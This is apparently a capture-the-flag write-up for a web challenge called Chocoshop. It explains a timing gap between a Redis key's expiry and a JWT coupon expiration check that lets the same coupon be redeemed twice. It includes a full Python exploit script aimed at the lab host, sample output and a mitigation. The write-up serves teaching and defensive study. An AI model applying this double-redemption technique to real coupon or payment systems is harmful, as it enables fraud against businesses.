# 🏁 Chocoshop!

---

## 📄 Description

The provided web application allows users to claim a coupon and submit it to receive money. Once enough money is collected, the user can purchase the flag.

Each user can **claim a JWT-based coupon once**, and it is **supposed to be redeemable only once**.

However, due to a **race condition vulnerability**, the coupon can be **submitted twice**, leading to unauthorized money gain and flag retrieval.

---

## 🔍 Code Breakdown

### 🔸 Import Libraries

```python
import requests
import json
import time
```

- `requests`: for sending HTTP requests
- `json`: for parsing server responses
- `time`: to precisely time coupon expiration

---

### 🔸 Configuration

```python
url = "http://host3.dreamhack.games:17025/"
session_id = "65a96b047a0a4196953e4f0d7c5f14b9"  # Obtained via /session
```

---

### 🔸 Claim Coupon Function

```python
def claim_coupon(session):
    headers = {"Authorization": session}
    response = requests.get(url + "coupon/claim", headers=headers)
    return json.loads(response.text)["coupon"]
```

- Sends a GET request with Authorization header to claim a JWT coupon

---

### 🔸 Submit Coupon Twice

```python
def submit_coupon_twice(session, coupon):
    headers = {"Authorization": session, "coupon": coupon}
    r = requests.get(url + "coupon/submit", headers=headers)
    print("First submit:", r.text)

    print("Waiting for 45 seconds...")
    time.sleep(45)

    r = requests.get(url + "coupon/submit", headers=headers)
    print("Second submit:", r.text)
```

- First submission is valid
- Waits exactly **45 seconds**
- Redis key expires → server thinks the coupon is reusable
- Second submission is also accepted

---

### 🔸 Claim Flag

```python
def claim_flag(session):
    headers = {"Authorization": session}
    r = requests.get(url + "flag/claim", headers=headers)
    print("FLAG:", r.text)
```

- If balance ≥ 2000, returns the flag

---

## ⚙️ Vulnerability – Race Condition

```python
if coupon['expiration'] < int(time()):
    raise BadRequest('Coupon expired!')
```

- Coupon expiration is checked using `int(time())`, which is accurate to the second
- The Redis key for the coupon also expires at that exact second
- There is a **1-second race window** where:
  - Redis no longer stores the coupon as used
  - Coupon’s expiration is not yet considered expired

This allows **double submission** of a coupon.

---

## 💣 Exploit Flow

1. Get session token from `/session`
2. Claim a coupon from `/coupon/claim`
3. Submit coupon once via `/coupon/submit`
4. Wait **exactly 45 seconds**
5. Submit the same coupon again (Redis key has expired)
6. Redeem the flag via `/flag/claim`

---

## 🧪 Full Exploit Script

```python
import requests
import json
import time

url = "http://host3.dreamhack.games:17025/"
session_id = "65a96b047a0a4196953e4f0d7c5f14b9"

def claim_coupon(session):
    headers = {"Authorization": session}
    response = requests.get(url + "coupon/claim", headers=headers)
    return json.loads(response.text)["coupon"]

def submit_coupon_twice(session, coupon):
    headers = {"Authorization": session, "coupon": coupon}
    r = requests.get(url + "coupon/submit", headers=headers)
    print("First submit:", r.text)

    print("Waiting for 45 seconds...")
    time.sleep(45)

    r = requests.get(url + "coupon/submit", headers=headers)
    print("Second submit:", r.text)

def claim_flag(session):
    headers = {"Authorization": session}
    r = requests.get(url + "flag/claim", headers=headers)
    print("FLAG:", r.text)

# Exploit flow
coupon = claim_coupon(session_id)
submit_coupon_twice(session_id, coupon)
claim_flag(session_id)
```

---

## 🏁 Output Example

```text
First submit: {"status": "success"}
Waiting for 45 seconds...
Second submit: {"status": "success"}
FLAG: {"status": "success", "message": "DH{...}"}
```

---

## ✅ Conclusion

- The bug is a result of a **race condition** between:
  - Coupon expiration (checked via `int(time())`)
  - Redis key TTL expiration
- When both align on the same second, Redis key expires **before** `int(time())` considers the coupon expired
- This gap allows a **second submission of the same coupon**

---

## 🛡️ Mitigation

```python
# Expiration check
if coupon['expiration'] < int(time()):
    raise BadRequest('Coupon expired!')

# Redis TTL sync with JWT expiration
r.expire(used_coupon, timedelta(seconds=coupon['expiration'] - int(time())))
```

- Synchronize Redis key TTL with the JWT expiration to eliminate the time gap

---

## 🔑 Key Summary

| Item         | Description                                  |
|--------------|----------------------------------------------|
| Vulnerability| Coupon re-use via race condition             |
| Cause        | Time gap between Redis TTL and time check    |
| Attack       | Wait 45 seconds → re-submit coupon           |
| Fix          | Sync Redis TTL with JWT expiration exactly   |
